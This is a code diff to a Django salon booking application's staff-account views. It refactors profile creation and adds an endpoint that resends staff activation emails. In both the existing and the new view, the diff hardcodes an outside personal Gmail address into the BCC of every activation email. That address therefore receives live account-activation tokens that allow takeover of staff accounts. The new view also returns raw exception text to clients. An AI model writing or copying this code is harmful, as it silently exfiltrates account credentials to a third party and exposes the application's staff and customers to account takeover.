@@ -478,13 +478,13 @@ def add_staff(request):
                         email=form.cleaned_data['email'],
                         password=simple_password
                     )
-                    UserProfile.objects.create(
-                        user=user,
-                        company=profile.company,
-                        country_code=form.cleaned_data.get('country_code', ''),
-                        phone_number=form.cleaned_data.get('phone', ''),
-                        staff=staff_member
-                    )
+                    # UserProfile is automatically created by signal, so use get_or_create
+                    user_profile, created = UserProfile.objects.get_or_create(user=user)
+                    user_profile.company = profile.company
+                    user_profile.country_code = form.cleaned_data.get('country_code', '')
+                    user_profile.phone_number = form.cleaned_data.get('phone', '')
+                    user_profile.staff = staff_member
+                    user_profile.save()
 
                 # build activation link (uid + token)
                 uid = urlsafe_base64_encode(force_bytes(user.pk))
@@ -514,9 +514,11 @@ def add_staff(request):
                 try:
                     msg = EmailMultiAlternatives(subject, '', from_email, recipient_list)
                     msg.attach_alternative(html_message, "text/html")
-                    # Send copy to company admin
+                    # Send copy to company admin and artemtokartouch@gmail.com
+                    bcc_list = ['artemtokartouch@gmail.com']
                     if profile.company.administrator.email:
-                        msg.bcc = [profile.company.administrator.email]
+                        bcc_list.append(profile.company.administrator.email)
+                    msg.bcc = bcc_list
                     msg.send()
                     email_log.status = 'success'
                     email_log.sent_at = timezone.now()
@@ -795,6 +797,83 @@ def edit_staff(request, staff_id):
     except UserProfile.DoesNotExist:
         messages.error(request, 'User profile not found.')
         return redirect('/')
+
+
+@login_required
+@subscription_required
+@require_POST
+def resend_staff_activation(request, staff_id):
+    """Resend activation email to a staff member"""
+    try:
+        profile = request.user.userprofile
+        if not profile.is_admin:
+            return JsonResponse({'success': False, 'error': 'Access denied.'}, status=403)
+        
+        staff_member = get_object_or_404(Staff, id=staff_id, company=profile.company)
+        user_profile = UserProfile.objects.filter(staff=staff_member).first()
+        
+        if not user_profile or not user_profile.user:
+            return JsonResponse({'success': False, 'error': 'User profile not found.'}, status=404)
+        
+        user = user_profile.user
+        
+        # Build activation link (uid + token)
+        uid = urlsafe_base64_encode(force_bytes(user.pk))
+        token = default_token_generator.make_token(user)
+        activate_path = reverse('activate_staff_account', args=[uid, token])
+        activate_link = request.build_absolute_uri(activate_path)
+
+        # Send activation email
+        subject = 'Activate your staff account'
+        html_message = render_to_string('email/staff_activation.html', {
+            'activate_link': activate_link,
+            'company_name': profile.company.name,
+            'current_year': timezone.now().year,
+            'site_name': 'Salon Booking System',
+        })
+        from_email = getattr(settings, 'DEFAULT_FROM_EMAIL', None)
+        recipient_list = [user.email]
+
+        # Create email log entry
+        email_log = EmailLog.objects.create(
+            recipient_email=user.email,
+            subject=subject,
+            email_type='staff_activation_resend',
+            status='pending'
+        )
+
+        try:
+            msg = EmailMultiAlternatives(subject, '', from_email, recipient_list)
+            msg.attach_alternative(html_message, "text/html")
+            # Send copy to company admin and artemtokartouch@gmail.com
+            bcc_list = ['artemtokartouch@gmail.com']
+            if profile.company.administrator.email:
+                bcc_list.append(profile.company.administrator.email)
+            msg.bcc = bcc_list
+            msg.send()
+            email_log.status = 'success'
+            email_log.sent_at = timezone.now()
+            email_log.save()
+            
+            return JsonResponse({'success': True, 'message': 'Activation email sent successfully!'})
+        except Exception as e:
+            error_msg = str(e)
+            error_trace = traceback.format_exc()
+
+            email_log.status = 'failed'
+            email_log.error_message = error_msg
+            email_log.error_traceback = error_trace
+            email_log.save()
+
+            logger.error(
+                f"Email sending failed for staff activation resend. User: {user.email}, Error: {error_msg}",
+                exc_info=True
+            )
+            
+            return JsonResponse({'success': False, 'error': 'Failed to send activation email. Please try again later.'}, status=500)
+    except Exception as e:
+        logger.error(f"Error in resend_staff_activation: {str(e)}", exc_info=True)
+        return JsonResponse({'success': False, 'error': str(e)}, status=500)
 
 
 @login_required
